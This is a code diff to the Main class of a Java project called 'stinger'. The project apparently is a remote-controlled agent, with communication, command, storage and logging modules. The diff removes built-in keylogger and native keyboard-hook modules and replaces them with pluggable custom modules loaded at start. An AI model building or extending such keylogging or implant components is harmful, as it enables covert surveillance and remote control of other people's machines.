@@ -3,14 +3,10 @@ package stinger;
 import com.castle.nio.temp.TempPath;
 import com.castle.nio.zip.OpenZip;
 import com.castle.nio.zip.Zip;
-import org.jnativehook.NativeHookException;
 import stinger.comm.CommunicationModule;
 import stinger.commands.CommandModule;
 import stinger.logging.FileLogger;
 import stinger.logging.LoggingModule;
-import stinger.os.keylogger.KeyloggerModule;
-import stinger.os.nhooks.NativeHooks;
-import stinger.os.nhooks.NativeHooksModule;
 import stinger.storage.PersistentStorage;
 import stinger.storage.Storage;
 import stinger.storage.StorageIndex;
@@ -21,6 +17,7 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.Arrays;
 import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.regex.Pattern;
@@ -42,8 +39,12 @@ public class Main {
             );
 
             CommandModule commandModule = new CommandModule(executorService, logger);
-            NativeHooksModule nativeHooksModule = new NativeHooksModule(logger);
-            KeyloggerModule keyloggerModule = new KeyloggerModule(executorService);
+
+            Set<Module> customModules = new HashSet<>();
+            customModules.addAll(OnStart.getCustomModules(new ModuleCreator(executorService)));
+
+            StingerEnvironment environment = new StingerEnvironmentImpl(storage, commandModule, logger, stingerControl,
+                    new StingerModuleImpl(customModules));
 
             Stinger stinger = new Stinger(
                     new HashSet<>(Arrays.<Module>asList(
@@ -51,12 +52,8 @@ public class Main {
                             new CommunicationModule(executorService),
                             new LoggingModule(executorService, logger)
                     )),
-                    new HashSet<>(Arrays.asList(
-                            keyloggerModule,
-                            nativeHooksModule
-                    )),
-                    new StingerEnvironmentImpl(storage, commandModule, logger, stingerControl,
-                            new StingerModuleImpl(nativeHooksModule, keyloggerModule)));
+                    customModules,
+                    environment);
             try {
                 logger.info("Stinger start");
                 stinger.start();
@@ -68,12 +65,6 @@ public class Main {
         } catch (Throwable t) {
             t.printStackTrace();
         } finally {
-            try {
-                NativeHooks.unregister();
-            } catch (NativeHookException e) {
-                e.printStackTrace();
-
-            }
             executorService.shutdownNow();
         }
     }
